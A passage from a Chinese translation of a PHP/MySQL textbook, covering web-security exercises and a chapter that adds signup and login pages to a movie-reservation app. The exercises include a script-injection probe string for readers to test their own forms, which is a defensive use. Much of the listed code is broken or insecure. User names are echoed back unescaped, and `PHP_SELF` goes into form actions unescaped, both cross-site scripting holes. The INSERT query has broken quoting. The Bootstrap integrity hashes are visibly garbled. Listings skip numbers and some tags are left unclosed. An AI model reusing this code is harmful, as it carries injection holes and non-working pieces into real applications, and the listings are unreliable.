如果你的网站使用 HTTPS，可以通过设置 `session.cookie_secure=On` 来进一步保护会话。此设置仅允许通过 HTTPS 访问会话 ID Cookie。

Let's Encrypt[^20] 是一个非营利证书颁发机构，提供免费的 TLS 证书。

[^20]: *Let’s Encrypt*: [https://letsencrypt.org](https://letsencrypt.org)

## 最后的想法

鉴于本书涉及使用 PHP 和 MySQL 开发 Web 应用程序，本章仅触及创建安全 Web 应用程序所需内容的表面。当编写将在野外发布（即部署并可在互联网上访问）的 Web 应用程序时，遵循指南 *开放式 Web 应用程序安全项目 (OWASP)* 网站 https://owasp.org 上列出的指南至关重要。网站安全是一个持续的过程。如我前面提到的，另一本优秀的资源是 Eric Mann 所著的书籍 *PHP 应用安全原则*。部署 Web 应用程序时，请确保其安全并保护用户的信息安全。

## 练习

- 1. 回到我们的电影数据库应用程序，重写查询以使用预处理语句，特别是如果它们包含用户提供的数据。
- 2. 在电影应用程序中，测试一些文本字段，看看是否可以注入以下值：`<script>alert('oh no!')</script>`。如果出现警告框，请更改代码，在显示之前转义用户的输入。
- 3. 在 Favorite Cookies 应用程序中，测试一些文本字段，看看是否可以注入以下值：`<script>alert('oh no!')</script>`。如果出现警告框，请更改代码，在显示之前转义用户的输入。
- 4. 检查电影数据库应用程序，并确保关于电影的任何用户提供的数据在输出时得到正确转义。





## 第23章

## 添加用户登录

> “Haskell 比 C++ 更快，比 Perl 更简洁，比 Python 更规范，比 Ruby 更灵活，比 C# 更具类型感，比 Java 更健壮，而且与 PHP 毫无共同之处。”
>
> —唐凤

## 23. 添加用户登录

既然我们已经掌握了保护 Web 应用程序的正确技术，现在回到我们的 *电影列表* 应用程序。我们需要对应用程序进行三项重大更改。首先，我们添加个人登录功能，并允许注册新用户。其次，我们添加导航菜单以提高应用程序的易用性。第三，我们加入一个预订系统，允许用户借出电影并归还。我们还将修改应用程序，只允许管理员添加、编辑和删除电影。以下是将 *电影列表* 应用程序转变为 *电影预订* 应用程序所需进行的修改的详细列表：

- 1. **添加个人用户登录**
  - 1. 创建一个数据库表，用于存储用户信息及其访问权限
  - 2. 为个人用户创建注册、登录和注销脚本
  - 3. 修改 `authorizeaccess.php` 脚本，只允许具有 `admin` 访问权限的用户添加、编辑和删除电影
- 2. **添加导航菜单以提高易用性**
  - 1. 创建并集成一个可供多个页面使用的导航栏脚本
- 3. **添加预订功能**
  - 1. 创建一个数据库表，用于存储电影预订信息
  - 2. 在 `movielisting` 数据库表中添加字段，以跟踪每部电影的副本数量和已预订电影
  - 3. 修改添加和编辑电影脚本，使其包含电影的副本数量
  - 4. 修改电影列表页面，为已登录用户显示预订电影的链接
  - 5. 修改电影列表页面，为以管理员权限登录的用户显示删除电影的链接
  - 6. 添加一个供用户借出电影的预订脚本
  - 7. 添加一个购物车脚本，允许用户预订购物车中的电影并将其从购物车中移除
  - 8. 添加一个购物车图标，允许用户查看其购物车
  - 9. 添加一个已预订电影脚本，允许用户归还电影
  - 10. 添加一个预订图标，允许用户查看其预订记录

在本章中，我们修改应用程序以添加个人用户登录。我们将在接下来的两章中添加其他功能。

## 创建用户表

要添加用户登录，我们需要在 Movie 数据库中创建另一个表来存储用户信息。让我们创建一个包含以下字段的用户表：

| 列名 | 类型 | 默认值 |
|---|---|---|
| id | int(11) 自动递增 | |
| user_name | varchar(50) | |
| password_hash | varchar(255) | |
| access_privileges | varchar(25) | [user] |
| date_created | datetime | [CURRENT_TIMESTAMP] |

> PHP 手册中关于 password_hash()[1] 的条目建议将哈希长度允许在 60 到 255 个字符之间，以便随着算法更新，哈希值可以随时间扩展。
>
> 在专业应用程序中，您会希望获取更多人口统计信息（联系信息等）。

使用 Adminer，在 Movie 数据库中创建一个新表，包含上面列出的列（及相关数据类型）。我们将有两种类型的访问权限：user 和 admin。当我们注册新用户时，我们希望将默认访问权限设置为 user。任何您希望拥有管理员权限的用户帐户都必须在数据库表中手动修改。我们还希望为 date_created 字段设置默认值 CURRENT_TIMESTAMP，该值也会在我们注册新用户时自动设置。

[1] password_hash(): https://php.net/password_hash

## 23. 添加用户登录

## 创建 Signup.php 脚本

为了允许新用户访问我们的应用程序，我们需要创建一个 signup.php 脚本。图 23.1 显示了我们希望注册页面的样子。

为了使我们的应用程序更安全，我们可能会在我们的“注册”表单上实现一个 CAPTCHA[2] 功能，以降低自动化脚本注册帐户的风险。验证码对用户来说很烦人，因此更好的实现是像 Google 的 reCAPTCHA 那样，如图 23.2 所示。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_346_0.png)

图 23.1.

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_346_1.png)

图 23.2.

Google 有一个新版本 v3[3]，通过分析来最大限度地减少用户交互，以更好地判断是用户还是自动化脚本在与网站交互。

### 创建注册表单

让我们先创建一个基本的 Bootstrap 页面，并将其命名为 signup.php，如清单 23.1 所示。

清单 23.1.

```
<!DOCTYPE html>
<?php
require_once('pagetitles.php');
$page_title = MR_SIGNUP_PAGE;
?>
<html>
<head>
<title><?= $page_title ?></title>
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC1Uk9sG9sG9sG9sG9sG9sG9sG9sG9sG9sG9sG9sG9sG9sG9sG9sG9sG9s" crossorigin="anonymous">
</head>
<body>
<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0mLsSsN5nCTpuj/zy4C+0GpamoFvY38MVBnE+IbbVYwew+OrCXaRkfj" crossorigin="anonymous"></script>
```

[2] CAPTCHA: https://en.wikipedia.org/wiki/CAPTCHA

[3] 版本 v3: https://www.google.com/recaptcha/intro/v3.html

```
18. <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"
19.     integrity="sha384-Q6EPRbIbV..."
20.     crossorigin="anonymous"></script>
21. <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js"
22.     integrity="sha384-OgV..."
23.     crossorigin="anonymous"></script>
24. </body>
25. </html>
```

注意，我添加了一个页面标题的定义，该定义包含在一个名为 pagetitles.php 的脚本中：

```
<!DOCTYPE html>
<?php
require_once('pagetitles.php');
$page_title = MR_SIGNUP_PAGE;
?>
```

这段代码稍后会帮助我们，当我们添加导航栏以根据访问权限显示指向特定页面的链接，以及当我们希望提供应用程序功能时。我稍后会更详细地介绍。

现在，创建一个名为 pagetitles.php 的新脚本，并添加注册页面的定义：

```
<?php
// Page Titles
define('MR_SIGNUP_PAGE', 'Movie Reservations - Sign Up');
```

现在回到我们的 signup.php 脚本。在 `<body>` 标签的开头，我们将添加一些描述性文本和用于注册新用户的表单，如清单 23.2 所示。

### 清单 23.2.

```
1. <body>
2. <div class="card">
3.     <div class="card-body">
4.         <h1>Sign up for a Movie Reservations Account</h1>
5.         <hr/>
6.         <form class="needs-validation" novalidate method="POST"
7.             action="<?= $_SERVER['PHP_SELF'] ?>">
8.             <div class="form-group row">
9.                 <label for="user_name"
10.                     class="col-sm-2 col-form-label-lg">User Name</label>
11.                 <div class="col-sm-4">
12.                     <input type="text" class="form-control"
13.                         id="user_name" name="user_name"
14.                         placeholder="Enter a user name" required>
15.                 <div class="invalid-feedback">
16.                     Please provide a valid user name.
```

```
</div>
</div>
</div>
<div class="form-group row">
    <label for="password"
           class="col-sm-2 col-form-label-lg">Password</label>
    <div class="col-sm-4">
        <input type="password" class="form-control"
               id="password" name="password"
               placeholder="Enter a password" required>
        <div class="form-group form-check">
            <input type="checkbox"
                   class="form-check-input"
                   id="show_password_check"
                   onclick="togglePassword()">
            <label class="form-check-label"
                   for="show_password_check">Show Password</label>
        </div>
        <div class="invalid-feedback">
            Please provide a valid password.
        </div>
    </div>
</div>
<button class="btn btn-primary" type="submit"
        name="signup_submission">Sign Up
</button>
</form>
</div>
</div>
// ?>
</body>
```

与之前为此应用程序创建的表单类似，您会注意到我添加了 Bootstrap 对密码和 user_name 字段的验证。因此，当用户未在这些表单字段中输入任何数据时，我们会得到图 23.3 所示的结果。

要启用此行为，与之前我们创建的需要验证的表单一样，我们需要将清单 23.3 中的 JavaScript 函数包含在 HTML `<body>` 中的 `<script>` 元素标签内（位于其他 `<script>` 标签之前）。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_348_0.png)




## 列表 23.3.

```
<body>
<div class="card">
  <div class="card-body">
    <h1>Sign up for a Movie Reservations Account</h1>
    <hr>
    <form ...>
      ...
    </form>
  </div>
</div>
<script>
// JavaScript for disabling form submissions if there are invalid fields
(function () {
'use strict';
window.addEventListener('load', function () {
// Fetch all the forms we want to apply custom Bootstrap validation styles to
var forms = document.getElementsByClassName('needs-validation');
// Loop over them and prevent submission
var validation = Array.prototype.filter.call(forms, function (form) {
  form.addEventListener('submit', function (event) {
    if (form.checkValidity() === false) {
      event.preventDefault();
      event.stopPropagation();
    }
    form.classList.add('was-validated');
  }, false);
});
}, false);
})();
</script>
<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"
integrity="sha384-DfXdz2htPH0lsSsSsNCTpuJ/zy4C+OGpamoFvy38MVBN..."
crossorigin="anonymous"></script>
```

此外，请注意我添加了一个复选框，可在您输入时显示密码，如图 23.4 所示。图 23.5 显示了选中时的情况。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_349_0.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_349_1.png)

## 23. 添加用户登录

复选框字段设置为在发生 onclick 事件时调用名为 togglePassword() 的 JavaScript 函数：

```
<input type="checkbox" class="form-check-input" id="show_password_check" onclick="togglePassword()">
```

在我们刚刚添加的表单字段验证函数下方、闭合 </script> 标签之前添加来自列表 23.4 的 JavaScript 函数 togglePassword()。

```
// Disable form submissions if there are invalid fields
(function () {
    ...
})();

// Toggles between showing and hiding the entered password
function togglePassword() {
    var password_entry = document.getElementById("password");
    if (password_entry.type === "password") {
        password_entry.type = "text";
    } else {
        password_entry.type = "password";
    }
}
```

当用户提交表单时，我们将验证凭据并创建账户或将他们重定向以更正输入。因此，我们需要添加条件逻辑以确保表单仅在我们希望显示时显示。

在表单之前添加布尔变量（列表 23.5）以显示表单，并将表单移入检查此条件的 if() 语句中。

```
<h1>Sign up for a Movie Reservations Account</h1>
<hr />
<?php
$show_sign_up_form = true;
if ($show_sign_up_form):
?>
<form ...>
...
</form>
<?php
endif;
?>
```

### 创建 Signup.php 脚本

### 创建新用户

让我们添加代码以在成功注册新用户时在 Movie 数据库中创建新用户。在将 `$show_sign_up_form` 设置为 true 之后，添加用户提交表单时的条件：

```php
<?php
    $show_sign_up_form = true;

    if (isset($_POST['signup_submission']))
    {
    }
```
```

在此条件内，从 $_POST 超全局变量中获取 user_name 和 password 字段，并添加一个条件来验证用户是否已为字段输入值，否则输出错误，提示他们需要正确填写表单，如列表 23.6 所示

## 列表 23.6.

```php
if (isset($_POST['signup_submission']))
{
    // Get user name and password
    $user_name = $_POST['user_name'];
    $password = $_POST['password'];

    if (!empty($user_name) && !empty($password))
    {
    }
    else
    {
        // Output error message
        echo "<h4><p class='text-danger'>You must enter both a "
             . "user name and password.</p></h4><hr/>";
    }
}
```
```

在 $user_name 和 $password 不为空的条件内，我们必须首先查询用户是否已存在于数据库中。然而，我们需要实践安全的数据库参数化，正如我在上一章关于保护 Web 应用程序中提到的，这需要编写相当多的代码。这是一个很好的机会，通过创建辅助函数来抽象出我们为参数化查询需要进行的常见调用。

## 23. 添加用户登录

### 创建 parameterizedQuery() 函数

让我们稍作偏离，创建一个函数来参数化我们对数据库查询的所有输入。此函数通过使用预处理语句来保护我们的 SQL 查询。创建一个名为 `queryutils.php` 的新脚本，我们可以在需要查询数据库的脚本中包含它。

首先，我们需要确定用于参数化查询的所有 PHP 函数及其输入参数。它们是：

| 函数 | 参数 | 返回值 | 参考 |
|---|---|---|---|
| `mysqli_prepare()` | connection, string query | statement | https://php.net/mysqli.prepare |
| `mysqli_stmt_bind_param()` | statement, string data types, variables (specified by their types) | true or false | https://php.net/mysqli-stmt.bind-param |
| `mysqli_stmt_execute()` | statement | true or false | https://php.net/mysqli-stmt.execute |
| `mysqli_stmt_get_result()` | statement | true or false | https://php.net/mysqli-stmt.get-result |
| `mysqli_errno()` | connection | error code | https://php.net/mysqli.errno |

创建查询时要考虑的另一件事是，我们可能有不同数量的查询参数需要参数化。PHP 的一个很酷的特点是，我们可以通过在参数列表中的最后一个变量前加上 ... 来创建接受可变数量参数的函数。有关可变长度参数的更多信息，请参阅在线文档[4]。

每当您创建函数时，最好有一个函数头来描述函数、任何输入参数和任何返回值。它作为使用函数的优秀文档，尤其是在使用 DocBlocks[5] 描述参数和返回值时。请记住，如果您更改函数的参数或其工作原理，则必须更新此注释。

> PHP 7 提供的另一个选项是使用标量和类类型提示来指示函数期望的参数类型以及返回的值。

[4] 可变长度参数: https://php.net/functions.arguments.php#functions.variable-arg-list
[5] 文档块: https://docs.phpdoc.org/3.0/guide/guides/docblocks.html

在脚本 queryutils.php 中，这里是我为此函数编写的函数头以及函数签名：

## 列表 23.7.

```
1. <?php
2.
3. /**
4.  * Purpose:      Parameterizes a database query
5.  *
6.  * Description:  Parameterizes an SQL query given a database connection, a query string, a data
7.  *               types string, and a variable number of parameters to be used in the query. If
8.  *               the query is successful, the database results object will be returned (or TRUE
9.  *               if no results set and the query was successful), otherwise FALSE will be returned
10.  *               and the connection will have to be queried for the last error.
11.  *
12.  * @param         $dbc database connection
13.  * @param         $sql_query SQL statement
14.  * @param         $data_types string containing one character for each parameter's type
15.  * @param         $query_parameters a variable list of parameters representing each query parameter
16.  *
17.  * @return string Database results set, otherwise false if there is a database error, or true if successful.
18.  */
19. function parameterizedQuery($dbc, $sql_query, $data_types, ...$query_parameters)
20. {
21. }
```

$data_types 是一个字符串，必须包含代表每个查询参数数据类型的字符。考虑一个有两个参数的查询，其中两个参数都是整数。$data_types 参数必须是字符串：'ii'。您将为 ...$query_parameters 传递两个变量到函数中。以下是使用这两个参数的示例：

```
$query = "DELETE FROM reservation WHERE user_id = ? AND movieListing_id = ?";

$result = parameterizedQuery($dbc, $query, 'ii', $user_id, $movie_to_delete);
```

使用 DocBlock 函数头还有一个有用的地方是，大多数集成开发环境（IDE），如 Visual Studio Code、PhpStorm 等，在调用函数时会在工具提示中显示信息，如图 23.6 所示。因此，让我们用列表 23.8 中的代码填充此函数的内部。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_353_0.png)




## 23. 添加用户登录

### 清单 23.8.

```php
function parameterizedQuery($dbc, $sql_query, $data_types, ...$query_parameters)
{
    $ret_val = false; // Assume failure

    if ($stmt = mysqli_prepare($dbc, $sql_query))
    {
        if (mysqli_stmt_bind_param($stmt, $data_types, ...$query_parameters)
            && mysqli_stmt_execute($stmt))
        {
            $ret_val = mysqli_stmt_get_result($stmt);

            if (!mysqli_errno($dbc) && !$ret_val)
            {
                $ret_val = true;
            }
        }
    }
    return $ret_val;
}
```

这段代码本质上是我在上一章中讲解过的重复内容，只是效率稍高一些。请注意，mysqli_stmt_bind_param() 函数很方便地接受传入的 $data_types 和 ...$query_parameters 可变参数。我们的新函数返回查询结果，如果出现错误则返回 false。

现在让我们回到使用这个新函数，在创建新用户之前检查尝试注册的用户是否已存在。如果你还记得，在我们的 signup.php 脚本中，我们处于已知用户已输入其用户名和密码的条件之下。

```php
// Get user name and password
$user_name = $_POST['user_name'];
$password = $_POST['password'];

if (!empty($user_name) && !empty($password))
{
}
```

由于我们正在查询数据库，必须包含我们的 dbconnection.php。我们还需要在清单 23.9 所示的方式要求我们的 queryutils.php 脚本来连接我们的 Movie 数据库。

### 清单 23.9.

```php
if (!empty($user_name) && !empty($password)) {
    require_once('dbconnection.php');
    require_once('queryutils.php');

    $dbc = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME)
        or trigger_error(
            'Error connecting to MySQL server for' . DB_NAME,
            E_USER_ERROR
        );
}
```

接下来（清单 23.10），创建一个参数化 SQL 字符串来查看该用户是否已存在，并调用我们的 parameterizedQuery() 函数。

### 清单 23.10.

```php
if (!empty($user_name) && !empty($password)) {
    // ...

    $dbc = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME)
        or trigger_error(
            'Error connecting to MySQL server for' . DB_NAME,
            E_USER_ERROR
        );

    // Check if user already exists
    $query = "SELECT * FROM user WHERE user_name = ?";

    $results = parameterizedQuery($dbc, $query, 's', $user_name)
        or trigger_error(mysqli_error($dbc), E_USER_ERROR);
}
```

如果该用户不存在，则不会返回任何行。我们可以利用此条件为其创建新的用户账户。否则，我们在清单 23.11 中通知用户该用户名下已存在一个账户。

## 完整代码清单

清单 23.13 是 queryutils.php 页面的完整清单。

### 清单 23.13.

```php
<?php

/**
 * Purpose:      Parameterizes a database query
 *
 * Description:  Parameterizes an SQL query given a database connection,
 *               a query string, a data types string, and a variable number
 *               of parameters to be used in the query. If the query is
 *               successful, the database results object will be returned
 *               (or TRUE if no results set and the query was successful),
 *               otherwise FALSE is returned and the connection has to be
 *               queried for the last error.
 *
 * @param $dbc            database connection
 * @param $sql_query      SQL statement
 * @param $data_types     string containing one character for each parameter type
 * @param $query_parameters variable list of parameters representing each query parameter
 * @return string         Database results set, false if there is an error, or true if successful.
 */
function parameterizedQuery($dbc, $sql_query, $data_types, ...$query_parameters)
{
    $ret_val = false; // Assume failure

    if ($stmt = mysqli_prepare($dbc, $sql_query))
    {
        if (mysqli_stmt_bind_param($stmt, $data_types, ...$query_parameters)
            && mysqli_stmt_execute($stmt))
        {
            $ret_val = mysqli_stmt_get_result($stmt);

            if (!mysqli_errno($dbc) && !$ret_val)
            {
                $ret_val = true;
            }
        }
    }
    return $ret_val;
}
```

清单 23.14 显示了 signup.php 页面的完整清单。

## 23. 添加用户登录

### 清单 23.14.

```php
1. <!DOCTYPE html>
2. <?php
3. require_once('pagetitles.php');
4. $page_title = MR_SIGNUP_PAGE;
5. ?>
6. <html>
7. <head>
8.   <title><?= $page_title ?></title>
9.   <link rel="stylesheet"
10.     href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css"
11.     integrity="sha384-9aIt2nRpC1Uk8g9S9baD1A11NQApFmC26EwAOH8kWzL5MYYxFfc+NcPb1dKGj7Sk"
12.     crossorigin="anonymous">
13. </head>
14. <body>
15. <div class="card">
16.   <div class="card-body">
17.     <h1>Sign up for a Movie Reservations Account</h1>
18.     <hr/>
19. <?php
20. $show_sign_up_form = true;
21. 
22. if (isset($_POST['signup_submission'])) {
23.   // Get user name and password
24.   $user_name = $_POST['user_name'];
25.   $password = $_POST['password'];
26. 
27.   if (!empty($user_name) && !empty($password)) {
28.     require_once('dbconnection.php');
29. 
30.     require_once('queryutils.php');
31. 
32.     $dbc = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME)
33.       or trigger_error(
34.         'Error connecting to MySQL server for ' . DB_NAME . '.',
35.         E_USER_ERROR
36.       );
37. 
38.   // Check if user already exists
39.   $query = "SELECT * FROM user WHERE user_name = ?";
40. 
41.   $results =
42.     parameterizedQuery($dbc, $query, 's', $user_name)
43.     or trigger_error(mysqli_error($dbc), E_USER_ERROR);
44. 
45.   // IF user does not exist, create an account for them
46.   if (mysqli_num_rows($results) == 0) {
47.     $salted_hashed_password =
48.       password_hash($password, PASSWORD_DEFAULT);
49.
```

## 创建一个 Signup.php 脚本

```php
$query = "INSERT INTO user (`user_name`, `password_hash`)"
    VALUES (?, '$salted_hashed_password')";
$results = parameterizedQuery($dbc, $query, 's', $user_name)
    or trigger_error(mysqli_error($dbc), E_USER_ERROR);

// Direct the user to the login page
echo "<h4><p class='text-success'>Thank you for signing up <strong>$user_name</strong>! "
    ."Your new account has been successfully created.<br/>"
    ."You're now ready to <a href='login.php'>log in</a>.</p></h4>";

$show_sign_up_form = false;
} else // An account already exists for this user
{
    echo "<h4><p class='text-danger'>An account already exists for this username:
<span class='font-weight-bold'> $user_name</span>. Please use
a different user name.</p></h4><hr/>";
}
} else {
    // Output error message
    echo "<h4><p class='text-danger'>You must enter both a user name
    and password.</p></h4><hr/>";
}
}
if ($show_sign_up_form):
?>
<form class="needs-validation" novalidate method="POST"
    action="<?= $_SERVER['PHP_SELF'] ?>"
<div class="form-group row">
    <label for="user_name"
        class="col-sm-2 col-form-label-lg">User Name</label>
    <div class="col-sm-4">
        <input type="text" class="form-control" id="user_name"
            name="user_name" placeholder="Enter a user name" required>
        <div class="invalid-feedback">Please provide a valid user name.</div>
    </div>
</div>
<div class="form-group row">
    <label for="password"
        class="col-sm-2 col-form-label-lg">Password</label>
    <div class="col-sm-4">
        <input type="password" class="form-control"
            id="password" name="password" placeholder="Enter a password" required>
        <div class="form-group form-check">
            <input type="checkbox" class="form-check-input" id="show_password_check"
                onclick="togglePassword()">
            <label class="form-check-label"
                for="show_password_check">Show Password</label>
        </div>
    <div class="invalid-feedback">Please provide a valid password.</div>
```



## 23. 添加用户登录

```html
</div>
</div>
<button class="btn btn-primary" type="submit" name="signup_submission">Sign Up
</button>
</form>
<?php
endif;
?>
</div>
</div>
<script>
  // JavaScript for disabling form submissions if there are invalid fields
  (function () {
    'use strict';
    window.addEventListener('load', function () {
      // Fetch all the forms we want to apply custom Bootstrap validation styles to
      var forms = document.getElementsByClassName('needs-validation');
      // Loop over them and prevent submission
      var validation = Array.prototype.filter.call(forms, function (form) {
        form.addEventListener('submit', function (event) {
          if (form.checkValidity() === false) {
            event.preventDefault();
            event.stopPropagation();
          }
          form.classList.add('was-validated');
        }, false);
      });
    }, false);
  })();

  function togglePassword() {
    var password_entry = document.getElementById("password");
    if (password_entry.type === "password") {
      password_entry.type = "text";
    } else {
      password_entry.type = "password";
    }
  }
</script>
<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"
        integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+Ogpa..."
        crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"
        integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldvI9Y0y5n3zV9zzTtm3lksdQRVvoxMfooAo"
        crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js"
        integrity="sha384-OgVRvuATP1z7JjHLkuou8xW704+h835Lr+6QL9UvYjZE3Ipu6T7jBh/kR0JKT"
        crossorigin="anonymous"></script>
</body>
</html>
```

### 创建 login.php 脚本

既然我们已经有了一个注册页面，现在需要创建一个 `login.php` 脚本，让用户能够登录我们的应用程序。我们期望的登录页面效果如图 23.7 所示。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_361_0.png)

> 在创建具有用户注册和登录功能的专业应用程序时，最好在应用程序中包含一个“忘记密码”链接。否则，你的管理员不会太喜欢你。我把这留作你的练习。

### 创建登录表单

同样，我们先创建一个基本的 Bootstrap 页面，并将其命名为 `login.php`（清单 23.15）。

清单 23.15.

```
1. <?php
2. session_start();
3. require_once('pagetitles.php');
4. $page_title = MR_LOGIN_PAGE;
5. ?>
6. <!DOCTYPE html>
7. <html>
8. <head>
9. <title><?= $page_title ?></title>
10. <link rel="stylesheet"
11. href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css"
12. integrity="sha384-9aIt2nRpC12Uk9gS9baDl4lN1QApFmC26EwAOH8WgZLSMYyXFfc+NcPbldKgj7Sk"
13. crossorigin="anonymous">
14. </head>
15. <body>
16. <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"
17. integrity="sha384-DfXdzh0tPHlSsS5nCTpuj/zy4C+OGpamoFVy38MBnE+IbbVYUew+OrCXaRkfj"
18. crossorigin="anonymous"></script>
19. <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"
20. integrity="sha384-Q6E9RHvbIyZFJfh4iFTs1bLk6Yf5Yf5Yf5Yf5Yf5Yf5Yf5Yf5Yf5Yf5Yf5Yf5"
21. crossorigin="anonymous"></script>
22. <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js"
23. integrity="sha384-OgVRvuATP1z7JjHLkuOU7xW704h83LSr+GQ9U9YjZE3Ipu6Tp75j7B7h/k0JKI"
24. crossorigin="anonymous"></script>
25. </body>
26. </html>
```

## 23. 添加用户登录

注意，我调用了 `session_start()`[6] 函数，因为我们将在用户成功登录后为其创建会话变量。还要注意，我为页面标题添加了一个定义，该定义包含在名为 `pagetitles.php` 的脚本中：

```
<!DOCTYPE html>
<?php
session_start();
require_once('pagetitles.php');
$page_title = MR_LOGIN_PAGE;
?>
```

将登录页面的定义添加到 `pagetitles.php` 中：

```
<?php
// Page Titles
define('MR_SIGNUP_PAGE', 'Movie Reservations - Sign Up');
define('MR_LOGIN_PAGE', 'Movie Reservations - Login');
```

现在回到我们的 `login.php` 脚本。在 `<body>` 标签的开头，我们将添加一些描述性文本以及用于用户登录的表单，如清单 23.16 所示。

### 清单 23.16.

```
1. <body>
2. <div class="card">
3.     <div class="card-body">
4.         <h1>Login to Movie Reservations Account</h1>
5.         <hr/>
6.         <form class="needs-validation" novalidate method="POST"
7.             action="<?php $_SERVER['PHP_SELF'] ?>"
8.             <div class="form-group row">
9.                 <label for="user_name" class="col-sm-2 col-form-label-lg">User
10.                 Name</label>
11.                 <div class="col-sm-4">
12.                     <input type="text" class="form-control" id="user_name"
13.                         name="user_name" placeholder="Enter a user name" required>
14.                     <div class="invalid-feedback">
15.                         Please provide a valid user name.
16.                     </div>
17.                 </div>
18.             </div>
19.             <div class="form-group row">
20.                 <label for="password" class="col-sm-2 col-form-label-lg">Password</label>
21.                 <div class="col-sm-4">
22.                     <input type="password" class="form-control" id="password"
23.                         name="password" placeholder="Enter a password" required>
24.                     <div class="invalid-feedback">
25.                         Please provide a valid password.
```

[6] session_start(): https://php.net/session_start

### 创建 login.php 脚本

```
</div>
</div>
</div>
<button class="btn btn-primary" type="submit" name="login_submission">Log In</button>
</form>
</div>
</div>
</body>
```

与注册表单一样，我们将为密码和 `user_name` 字段添加 Bootstrap 的验证，这样当用户未在这些表单字段中输入任何数据时，我们会看到图 23.8 所示的效果。

与注册表单一样，我们需要将 JavaScript 函数（清单 23.17）包含在 HTML `<body>` 中的 `<script>` 元素标签内（紧挨着其他 `<script>` 标签之前）：

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_363_0.png)

### 清单 23.17.

```
<body>
<div class="card">
<div class="card-body">
<h1>Login to Movie Reservations Account</h1>
<hr/>
<form ...>
...
</form>
</div>
</div>
<script>
// JavaScript for disabling form submissions if there are invalid fields
(function () {
'use strict';
window.addEventListener('load', function () {
// Fetch all the forms we want to apply custom Bootstrap validation styles to
var forms = document.getElementsByClassName('needs-validation');
// Loop over them and prevent submission
var validation = Array.prototype.filter.call(forms, function (form) {
form.addEventListener('submit', function (event) {
if (form.checkValidity() === false) {
event.preventDefault();
event.stopPropagation();
}
form.classList.add('was-validated');
}, false);
});
```

## 23. 添加用户登录

```
27.     });
28.     }, false);
29. })();
30. </script>
31. <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"
32.     integrity="sha384-DfXdzh0tPH0lSSs5nCTpuJ/zy4C+OGpamoFvy38MBnE+IbbVYUeW+0rCXaRkfj"
33.     crossorigin="anonymous"></script>
```

当用户提交表单时，我们会验证凭据，然后要么让用户登录，要么重定向到需要修正输入的地方。要成功登录，用户必须存在于 Movie 数据库的 `user` 表中，且密码必须正确。一旦我们在数据库中验证了用户的凭据，我们就通过为该用户的 `user_id` 和 `user_name` 设置会话变量来标记其已通过身份验证。设置会话变量后，我们将用户重定向到 `index.php` 页面。如果用户导航到 `login.php` 脚本，我们会显示其已登录，而不是显示表单。

因此，添加以下条件逻辑，使表单仅在 `user_id` 会话变量为空时显示。然后，将表单移到 `if` 条件内。另外，添加一个 `elseif` 条件，当设置了 `user_name` 会话变量时，显示用户已登录，如清单 23.18 所示。

### 清单 23.18.

```
1. <h1>Login to Movie Reservations Account</h1>
2. <hr/>
3. <?php
4.     if (empty($_SESSION['user_id'])):
5. ?>
6. <form>
7.     <!-- ... -->
8. </form>
9. <?php
10.     elseif (isset($_SESSION['user_name'])):
11.         echo "<h4><p class='text-success'>You are logged in as:
12.             <strong>{$_SESSION['user_name']}</strong>.</p></h4>";
13.     endif;
14. ?>
```

## 登录用户

让我们添加代码以在成功验证其凭据后登录用户。

在 if (empty($_SESSION['user_id'])): 之前，添加一个条件来检查 user_id 会话变量是否为空且用户已提交表单（清单 23.19）。

### 清单 23.19.

```php
1. <h1>Login to Movie Reservations Account</h1>
2. <hr/>
3. <?php
4. if (empty($_SESSION['user_id']) && isset($_POST['login_submission']))
5. {
6. }
7. 
8. if (empty($_SESSION['user_id'])):
9. ?>
10. <form ...>
```

在该条件内部（清单 23.20），从 $_POST 超全局变量中获取 user_name 和 password 字段，并添加一个条件来验证用户是否已为字段输入值，否则输出错误提示他们需要正确填写表单：

### 清单 23.20.

```php
1. if (empty($_SESSION['user_id']) && isset($_POST['login_submission']))
2. {
3. // Get user name and password
4. $user_name = $_POST['user_name'];
5. $password = $_POST['password'];
6. 
7. if (!empty($user_name) && !empty($password))
8. {
9. }
10. else
11. {
12. // Output error message
13. echo "<h4><p class='text-danger'>You must enter both a user name
14. and password.</p></h4><hr/>";
15. }
16. }
```

## 创建 login.php 脚本

### 清单 23.23.

```php
if (!empty($user_name) && !empty($password))
{
    // ...
    $results = parameterizedQuery($dbc, $query, 's', $user_name)
        or trigger_error(mysqli_error($dbc), E_USER_ERROR);

    // IF user was found, validate password
    if (mysqli_num_rows($results) == 1)
    {
    }
    else if(mysqli_num_rows($results) == 0) // User does not exist
    {
